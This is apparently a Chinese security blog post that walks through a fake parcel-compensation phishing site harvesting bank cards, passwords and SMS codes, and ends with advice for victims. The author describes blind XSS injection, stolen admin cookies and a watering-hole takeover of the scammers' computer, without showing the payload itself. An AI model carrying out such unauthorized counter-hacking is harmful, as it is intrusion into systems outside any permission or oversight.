<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
<p>选择之后会让你填写资料，包括卡号，身份证、网银密码之类的。</p>
<p>为什么要输入密码？它会告诉你要绑定“快捷退款”。</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/12.png">



<p>不过，他们会把银行卡密码称之为“退款密码”。</p>
<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
<p>最后再收个手机验证码，流程就跑完了。</p>
<p>页面做得挺仔细，还要勾选同意一个服务协议，这观感，是正规网站没错了。/狗头</p>
<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
<p>一般来说，到了这个页面，钓鱼团伙会守在后台，实时把受害者输入的短信验证码拿到真正的银行网站去尝试，所以一旦提交，钱就没了。</p>
<p>我把这个钓鱼网站的网址输入电脑，发现这么一句话：</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/13.png">





<p>**3</p>
<p>**</p>
<p>**<br>**</p>
<p>电脑启动，打开目标网址，然后在手机号处和银行卡信息填写处，尝试盲打，打入了XSS的payload，然后利用水坑钓鱼成功控制了诈骗分子的电脑</p>
<p>插入payload，不需要闭合标签，盲打就完事了</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/14.png">

<p>成功打到了后台以及Cookie信息，准备钓鱼</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/15.png">



<p>水坑钓鱼不做太多概述，已经是老生常谈了</p>
<p><strong>4</strong></p>
<p>目标上线，机器上有360安全卫士。</p>
<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
<p>截图看一眼对方在做什么</p>
<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
<p>然后在对面机器上翻到了一些资料，准备深入研究下</p>
<p>下图是从目标机器桌面上拿下来的文件</p>
<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
<p>这些诈骗分子应该是从电商渠道或快递渠道买到了宝妈们的信息，然后去一个个联系去实施诈骗行为</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/16.png">

<p>诈骗分子还会用点卡和网游来洗钱</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/17.png">

<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/18.png">

<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/19.png">

<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
<p>诈骗分子还有理赔话术，做的就和真的一样</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/20.png">

<p>进下后台看看先</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/21.png">

<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/22.png">

<p>目标的QQ</p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/23.png">

<p>最后定位IP</p>
<p><img src="/.io//gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p>
<p>最后问了朋友，云南边境的一些国家走的是我们国家的网络，所以这个云南的IP不一定是真实的位置，可能是在境外，到此为止，部分资料已移交给wj蜀黍</p>
<p><strong>经过两天时间观察，我们已经知道了理赔类诈骗分子的套路：</strong></p>
<p>1.诈骗分子会去购买快递或者电商数据，通过短信/电话方式联系受害者，关注公众号或者扫描二维码等等</p>
<p>2.诈骗分子会通过联系受害者，添加快递理赔客服微信号（我是某快递/JD/TB等理赔客服，现因XXX的一个包裹在运输中丢失了，按照我公司双倍理赔，诱导受害人添加诈骗分子理赔客服的微信，添加微信后就会让受害者识别二维码进行双倍理赔。）</p>
<p>3.诈骗分子会诱导受害人，告知需要查看芝麻信用，让受害人去从借呗借钱或其他贷款软件，然后提现到绑定的银行卡里面。</p>
<p>4.等受害人扫描后中国二维码就相当于自己把个人信息和银行卡信息填写了上去，然后诈骗分子会去真实银行网站重置受害人等网银密码并转账到他们自己到账户里或者去购买点卡以及其他到虚拟物品！</p>
<p>5.遇到主动联系你并想给你钱的，直接拉黑就完事了，天上哪会掉馅饼，只会掉陷阱给你去踩，所以不听不信不转账就对了</p>
<p><strong>如何防范：</strong></p>
<p>**<br>**</p>
<ol>
<li>近期凡事要转账或者各种京东/淘宝/支付宝等等理赔到都不要理他，一律视为诈骗</li>
<li>微信扫描二维码到地址建议下拉看域名或者右上角复制链接到浏览器里面去看</li>
<li>宝妈们遇到此类诈骗记得先报警或者记得问问自己老公</li>
</ol>
<p><strong>昨日的一则案例：</strong></p>
<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/24.png">

<img src="https://ckcah.github.io/images/%E8%BF%91%E6%9C%9F%E9%AB%98%E5%8F%91%E6%94%AF%E4%BB%98%E5%AE%9D/25.png">





<p><strong>遇到诈骗一定要报警：</strong></p>
<p>1.能有机会帮你追回钱的只有警察蜀黍，其他人都帮不了你的，一定要相信警察蜀黍</p>
<p>2.警察蜀黍们也很忙，但是你的案件是肯定会被处理和跟进的，所以不用太着急</p>
<p>3.没有被骗钱的话，遇到了诈骗，建议发朋友圈或者其他信息告知更多人，避免亲友被骗</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>姿势学习</tag>
      </tags>
  </entry>
</search>
